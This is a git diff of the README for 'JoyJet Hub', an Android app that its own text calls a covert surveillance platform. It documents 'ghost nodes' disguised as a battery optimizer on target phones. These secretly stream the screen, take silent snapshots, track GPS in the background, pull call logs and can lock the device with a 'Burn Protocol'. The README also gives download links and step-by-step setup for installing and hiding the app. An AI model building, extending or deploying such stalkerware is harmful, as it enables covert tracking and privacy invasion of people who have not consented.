@@ -1,145 +1,242 @@
-# 🚀 JOYJET HUB: SURVEILLANCE & COMMAND
+<div align="center">
 
-React Native (Expo) high-performance HD mobile suite for real-time node monitoring, tactical mapping, and stealth telemetry.
+# ☣ JOYJET HUB
+
+**Master Surveillance & Command Platform**  
+*Real-time node monitoring · HD screen streaming · Tactical GPS · Covert telemetry*
+
+[![Build APK](https://github.com/guru9/joyjet-hub/actions/workflows/build.yml/badge.svg)](https://github.com/guru9/joyjet-hub/actions)
+[![React Native](https://img.shields.io/badge/React%20Native-0.83-61DAFB?logo=react)](https://reactnative.dev)
+[![Expo](https://img.shields.io/badge/Expo-55-000020?logo=expo)](https://expo.dev)
+[![Socket.IO](https://img.shields.io/badge/Socket.IO-4.8-010101?logo=socket.io)](https://socket.io)
+[![Android](https://img.shields.io/badge/Android-API%2030%2B-3DDC84?logo=android)](https://developer.android.com)
+[![License: ISC](https://img.shields.io/badge/License-ISC-blue)](./LICENSE)
+
+[📥 Download Latest APK](https://github.com/guru9/joyjet-hub/releases/latest/download/app-release.apk) · [📘 Full Feature Manual](./FEATURES.md) · [🖥️ Server Repo](https://github.com/guru9/joyjet-server)
+
+</div>
 
 ---
 
-## 📘 Documentation & Downloads
+## 🔍 What is JoyJet?
 
-- **[TECHNICAL FEATURES MANUAL](./FEATURES.md)** - Detailed flowcharts and technical deep-dives.
-- **[LATEST BUILD CHANGELOG](./CHANGELOG.md)** - Version history and new feature highlights.
-- **[DOWNLOAD LATEST APK](https://github.com/guru9/joyjet-hub/releases/latest/download/app-release.apk)** - Compiled for Android 11+ (API 30-35).
+JoyJet is a **covert mobile surveillance platform** built in React Native. It provides a centralized Admin command center to monitor, control, and extract intelligence from remote ghost nodes — all in real-time over an encrypted WebSocket + WebRTC connection.
+
+> **Disguise**: Ghost nodes appear as "Battery Optimizer AI" on the target device.
 
 ---
 
-## 🛰️ System Architecture
+## 🏗️ System Architecture
 
 ```mermaid
 graph TD
-    A[Admin Command Center] -->|Socket.io| S[Master Relay Server]
-    V[Viewer Node] -->|Socket.io| S
-    G[Ghost Node] -->|Socket.io| S
-    G <-->|WebRTC P2P| A
-    G <-->|WebRTC P2P| V
-    G -->|Location/Vitals| S
-    S -->|Broadcast| A
+    A[☣ Admin Command Center] -->|Socket.io Auth + Commands| S[🖥️ JoyJet Master Hub Server]
+    V[👁️ Viewer Node] -->|Socket.io Auth| S
+    G[👻 Ghost Node - Target Device] -->|Socket.io Heartbeat + Telemetry| S
+    G <-->|WebRTC P2P — Encrypted Live Stream| A
+    G <-->|WebRTC P2P — Encrypted Live Stream| V
+    S -->|Relay Vitals + Commands| A
+    S -->|Relay Vitals| V
+```
+
+### 3-Tier Authority Model
+| Role | Key Format | Capability |
+|---|---|---|
+| **Admin** | `admin` + PIN | Global: sees ALL nodes, issues all commands, Burn Protocol |
+| **Viewer** | alphanumeric ≥4 chars | Restricted: monitors their own ghost nodes only (max 3) |
+| **Ghost** | `prefix_suffix` | Runs silently on target device — streams screen + location |
+
+---
+
+## ✨ Core Features
+
+| Feature | Description |
+|---|---|
+| 📡 **Live HD Streaming** | WebRTC P2P encrypted screen stream `480×854 @ 15fps` |
+| 🛰️ **Tactical GPS** | Dual-layer location tracking — foreground + background task |
+| 📸 **Silent Snapshots** | Remote JPG capture with zero visible indication on target |
+| ☣ **Burn Protocol** | Permanent node destruction + skull lockscreen on target |
+| 🚨 **Remote Wipe** | Soft disconnect — node returns to login without data deletion |
+| ⏸️ **Pause / Resume** | Power-save sleep mode — ~80% battery saving on target |
+| 📞 **Call Log Sync** | Pull last 10 call records from target device silently |
+| 🃏 **Stealth Cloak** | One-tap background hide — surveillance continues invisibly |
+| 🔴🟠🟢 **Traffic Lights** | Real-time color-coded node status system |
+| 🔐 **Smart Validation** | Real-time key format validation + live server prefix check |
+| 📟 **CyberAlert UI** | Hacker-themed alert modal replacing all native OS popups |
+| 📂 **Evidence Gallery** | Organised local snapshot storage in named gallery albums |
+
+---
+
+## 🔑 Access Key System
+
+Keys are validated in real-time — special characters are blocked at the keyboard; the Login button stays **disabled** until the format is fully correct.
+
+```
+Admin  →  admin               (+ secure PIN)
+Viewer →  alphaname           (alphanumeric, min 4 chars)
+Ghost  →  alphaname_nodename  (prefix_suffix, each min 4 chars, alphanumeric only)
+```
+
+**Ghost prefix live-check**: After typing a valid prefix + `_`, the app instantly queries
+the server to confirm the parent viewer is online and shows a `✅ PREFIX VALID` or `✗ PREFIX NOT FOUND` badge.
+
+---
+
+## 🚀 Quick Start
+
+### 1. Set up the Server
+```bash
+git clone https://github.com/guru9/joyjet-server.git
+cd joyjet-server
+npm install
+
+# Create .env file
+echo "ADMIN_SECRET_KEY=yourSecretPin" > .env
+echo "PUBLIC_URL=https://your-server.onrender.com" >> .env
+
+npm start
+```
+
+### 2. Install the App
+Download the APK from [Releases](https://github.com/guru9/joyjet-hub/releases/latest) and install on Android 11+ devices.
+
+Or build from source:
+```bash
+git clone https://github.com/guru9/joyjet-hub.git
+cd joyjet-hub
+npm install
+npx expo run:android       # Dev build
+```
+
+### 3. Configure Server URL
+Edit `src/services/socket.js` and set your server URL:
+```javascript
+const socket = io('https://your-server.onrender.com');
+```
+
+### 4. Login & Operate
+| Step | Who | Action |
+|---|---|---|
+| 1 | Admin | Open app → key: `admin` → enter PIN → login |
+| 2 | Viewer | Open app → key: `alpha` → login |
+| 3 | Ghost | Open app on target → key: `alpha_phone1` → login → tap CALIBRATE → STEALTH CLOAK |
+| 4 | Admin | Select node → FEED/MAP/SNAPS/CALLS/LOGS tabs |
+
+---
+
+## 🛠️ Tech Stack
+
+### Client (This Repo)
+| Technology | Version | Purpose |
+|---|---|---|
+| **React Native** | 0.83 | Core mobile framework (New Architecture / JSI enabled) |
+| **Expo** | 55 | Managed modules: Battery, Location, TaskManager, MediaLibrary |
+| **react-native-webrtc** | 124 | P2P screen streaming with STUN NAT traversal |
+| **Socket.IO Client** | 4.8 | Real-time bidirectional command/telemetry channel |
+| **expo-location** | — | Foreground + background GPS with TaskManager integration |
+| **expo-battery** | — | Battery level and charging state monitoring |
+| **expo-media-library** | — | Evidence gallery album management |
+| **expo-file-system** | — | Local file handling for screenshots |
+| **react-native-view-shot** | — | Silent screen capture (snapshot command) |
+| **react-native-call-log** | — | Remote call history extraction |
+| **React Navigation** | 7 | Gesture-driven tab workspace |
+| **@expo/vector-icons** | — | MaterialCommunityIcons icon library |
+
+### Server ([joyjet-server](https://github.com/guru9/joyjet-server))
+| Technology | Version | Purpose |
+|---|---|---|
+| **Node.js** | 20+ | Server runtime |
+| **Express** | 4 | HTTP server and health endpoint |
+| **Socket.IO** | 4.8 | WebSocket engine — auth, relay, commands |
+| **fs (built-in)** | — | JSON-based node registry persistence |
+| **axios** | — | Server keep-alive heartbeat to Render.com |
+
+---
+
+## 📁 Project Structure
+
+```
+joyjet-hub/
+├── src/
+│   ├── utils/
+│   │   ├── theme.js            ← Design system tokens (colors, radii, shadows)
+│   │   └── GlobalAlert.js      ← Global CyberAlert event emitter
+│   ├── services/
+│   │   └── socket.js           ← Socket.IO client singleton
+│   ├── components/
+│   │   ├── AppHeader.js        ← Branded JOYJET header
+│   │   ├── CyberAlertModal.js  ← Hacker-themed alert overlay
+│   │   ├── LogConsole.js       ← Terminal-style system log viewer
+│   │   ├── VideoFeed.js        ← WebRTC live stream renderer
+│   │   ├── TacticalMap.js      ← GPS map component
+│   │   ├── SnapshotGallery.js  ← Evidence image grid + download
+│   │   ├── CallLogViewer.js    ← Call history component
+│   │   └── StatusCard.js       ← Compact vitals bar
+│   └── screens/
+│       ├── LoginScreen.js      ← Smart auth gateway with live validation
+│       ├── AdminScreen.js      ← Full command center
+│       ├── GhostScreen.js      ← Stealth target node interface
+│       ├── ViewerScreen.js     ← Field monitor (prefix-restricted)
+│       └── GuideScreen.js      ← In-app operational manual
+├── FEATURES.md                 ← Complete technical & operational encyclopedia
+├── app.json                    ← Expo config (permissions, build settings)
+└── .github/workflows/          ← CI/CD GitHub Actions build pipeline
 ```
 
 ---
 
-## ⚡ Core Workflows
+## 📋 Android Permissions
 
-### 1. The Admin (Master Controller)
-**Objective**: Unified oversight and remote intervention.
-- **Initialization**: Login as `admin` with the `ADMIN_SECRET_KEY`.
-- **Command Loop**: Select a Ghost from the horizontal "Node Selector".
-- **Operation**: Switch between **FEED** (Live Video), **MAP** (GPS), **SNAPS** (Captures), **CALLS** (Logs), and **LOGS** (System updates).
-- **Dual Role**: The Admin automatically acts as a Viewer. Any Ghost node named with the prefix `admin_` (e.g., `admin_MyNode`) will be exclusively bound to the Admin's internal viewer-context.
-- **Intervention**: Trigger `SNAPSHOT` for proof or `WIPE` to clear the node if compromised.
-
-### 2. The Viewer (Field Monitor)
-**Objective**: Dedicated monitoring of a specific squad (max 3 ghosts).
-- **Initialization**: Register a unique `VIEWERNAME`.
-- **Ghost Binding**: Once the viewer is active, connect ghosts with the prefix `VIEWERNAME_`.
-- **Constraint**: Automatic rejection if more than 3 ghosts attempt to bind to one viewer.
-
-### 3. The Ghost (Stealth Node)
-**Objective**: Background telemetry and stream projection.
-- **Prefix Rule**: Prefix must match an Active Viewer or be `admin_` to bind specifically to the Master Controller.
-- **Workflow**:
-    1. Login with `VIEWERNAME_Suffix` or `admin_Suffix`.
-    2. Click **CALIBRATE** to initialize Media Projection.
-    3. Grant **Background Location** and **Call Log** permissions.
-    4. Screen Sharing/GPS runs silently in the background via `TaskManager`.
+| Permission | Purpose |
+|---|---|
+| `ACCESS_FINE_LOCATION` | 10m-precision GPS tracking |
+| `ACCESS_BACKGROUND_LOCATION` | Background location task (survives screen lock) |
+| `READ_CALL_LOG` | Remote call history extraction |
+| `READ_PHONE_STATE` | Device status and signal monitoring |
+| `FOREGROUND_SERVICE` + `FOREGROUND_SERVICE_LOCATION` | Background services |
+| `FOREGROUND_SERVICE_MEDIA_PROJECTION` | Screen capture stream |
+| `SYSTEM_ALERT_WINDOW` | Overlay permissions for stream |
+| `CAMERA` + `RECORD_AUDIO` | WebRTC screen sharing prerequisites |
+| `RECEIVE_BOOT_COMPLETED` | Auto-restart background tasks after reboot |
 
 ---
 
-## 📸 Visual Intelligence: Streaming vs. Capture
+## ⚙️ Build & CI/CD
 
-It is critical to distinguish between the two methods of remote viewing available in the Command Center:
+Every push to `main` triggers a GitHub Actions workflow:
+1. Installs dependencies and Expo CLI
+2. Compiles native Java/C++ modules (WebRTC, location)
+3. Signs and packages `app-release.apk`
+4. Publishes APK to GitHub Releases
 
-### A. Live HD Streaming (Real-Time)
-*   **Technology**: WebRTC Peer-to-Peer.
-*   **Usage**: Used for active, second-by-second observation of the device screen.
-*   **Behavior**: High bandwidth, low latency. Data is **transient** (not saved to server). If the connection drops or the tab is closed, the stream terminates.
-*   **Best For**: Watching live interactions, social media usage, or real-time navigation.
-
-### B. Remote Snapshots (Static Proof)
-*   **Technology**: `react-native-view-shot` + Base64 Socket Relay.
-*   **Usage**: Used for capturing specific evidence or "frozen" states of the device.
-*   **Behavior**: High resolution, fixed image. Data is **persistent for the session**. All captures are stored in the `SNAPS` gallery until the Admin logs out.
-*   **Best For**: Capturing chats, account details, or proving a node's exact state at a specific time.
+**Hardware Requirements**:
+- Android API 30+ (Android 11 minimum)
+- 2GB+ RAM recommended for HD streaming
+- Active internet connection (WiFi or LTE/5G)
 
 ---
 
-## 📋 Security & Permissions Reference
+## 📊 Data Flow & Privacy
 
-### Hardware Access Mapping
+| Data Type | Server Storage | Ghost Storage | Admin Storage |
+|---|---|---|---|
+| Live video stream | None (P2P) | None | None (RAM only) |
+| Snapshots | None (relay only) | None | Session RAM + optional download |
+| GPS coordinates | Last known only | None | Rendered on map |
+| Call logs | None | None | Session RAM |
+| Node registry | ✅ JSON file | — | — |
 
-| Permission | Feature | Library | Function |
-| ---------- | ------- | ------- | -------- |
-| `ACCESS_FINE_LOCATION` | **Tactical Map** | `expo-location` | 10m precision GPS plotting. |
-| `ACCESS_BACKGROUND_LOCATION` | **Perpetual Tracking** | `TaskManager` | Signal remains active when screen is off. |
-| `READ_CALL_LOG` | **History Recovery** | `react-native-call-log` | Remote sync of last 10 encrypted records. |
-| `READ_PHONE_STATE` | **Telemetry** | Identifies device status and incoming call alerts. |
-| `BATTERY_STATS` | **Vitals** | `expo-battery` | Reports percentage to logs and admin header. |
-| `FOREGROUND_SERVICE` | **Stay Alive** | Prevents Android from killing the ghost process. |
-| `SCREEN_CAPTURE` | **Video Feed** | `react-native-webrtc` | Captures display buffer for HD streaming. |
-
-### Command Logic (Remote Execution)
-
-- **`SNAPSHOT`**: Uses `react-native-view-shot` to dump the current viewport to a compressed JPG and relay it to Admin gallery.
-- **`PING`**: Overrides internal timer to force an immediate `getCurrentPositionAsync` update.
-- **`LOG_SYNC`**: Queries the device database for call history and emits a `ghost_activity` payload.
-- **`WIPE`**: Triggers a sequence of `Vibration(50) -> pc.close() -> onLogout()` to safely detach from the network.
+The server is a **pure relay** — no media content is ever persisted to disk.
 
 ---
 
-## 🔧 Tech Stack Details
+## 📘 Documentation
 
-| Technology | Purpose |
-| ---------- | ------- |
-| **React Native 0.83** | Core UI framework with New Architecture JSI support. |
-| **Expo 55** | Managed native modules for Battery, Location, and TaskManager. |
-| **WebRTC 124** | High-performance P2P streaming utilizing STUN for NAT traversal. |
-| **Socket.IO 4.8** | Real-time command/control websocket infrastructure. |
-| **React Navigation 7** | Gesture-driven tabbed workspace management. |
-
----
-
-## 📦 Deployment & Build
-
-### CI/CD Pipeline
-Every push to `main` triggers an automated GitHub Action that:
-1. Lints the codebase for React Native 0.83+ safety.
-2. Compiles the Java/C++ native modules for WebRTC.
-3. Packages the `app-release.apk` with all permissions pre-enabled.
-
-### Hardware Requirements
-- **Android**: API 30+ (Android 11) recommended for stable Background Location.
-- **RAM**: 2GB+ for smooth HD Video Streaming.
-
----
-
-## 🛠️ Performance Optimizations
-
-1. **Selective Rendering**: Admin dashboard unmounts Video/Map components when their tabs are not active to save RAM.
-2. **Conditional Heartbeat**: Ghost nodes scale back heartbeat frequency if battery is <15% to prolong uptime.
-3. **P2P Relay**: Uses Google STUN servers for NAT traversal, ensuring connections even on cellular LTE/5G.
-
----
-
-## 💾 Data Lifecycle & Session Storage
-
-| Feature | Storage Level | Behavior |
-| --- | --- | --- |
-| **Snapshots** | **App Memory (Admin)** | Persists until Admin logout. Accessible in `SNAPS` gallery. |
-| **Call Logs** | **App Memory (Admin)** | Persists until Admin logout. Accessible in `CALLS` tab. |
-| **GPS Points** | **Transient (Map Path)** | Redrawn on ogni signal. Not stored as history. |
-| **Vitals (Battery)** | **Server Memory** | Last known state recovered instantly on Admin login. |
+- **[FEATURES.md](./FEATURES.md)** — Complete 20-section technical & operational encyclopedia with "How to Use" for every feature
+- **[Server README](https://github.com/guru9/joyjet-server#readme)** — Server deployment, environment variables, and architecture
 
 ---
 
 ## 📄 License
 
-ISC - GURU PROTOCOL 2026
+ISC — GURU MASTER PROTOCOL © 2026
